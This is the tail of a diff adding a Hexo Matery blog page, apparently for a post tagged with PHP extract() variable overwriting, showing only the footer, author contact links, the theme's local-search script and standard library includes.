+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/extract-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E9%94%AE%E5%80%BC%E9%80%83%E9%80%B8/">
+                        <span class="chip bg-color">extract()变量覆盖 键值逃逸</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022-2023</span>
+            
+            <a href="/about" target="_blank">kingkb</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;Total Words:&nbsp;<span
+                        class="white-color">64.2k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/kingofkb" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1527411491@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1527411491" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1527411491" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+    <a href="https://space.bilibili.com/283283733?spm_id_from=333.1007.0.0" class="tooltipped" target="_blank" data-tooltip="关注我的B站" data-position="top" data-delay="50">
+        <i class="fa-brands fa-bilibili"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
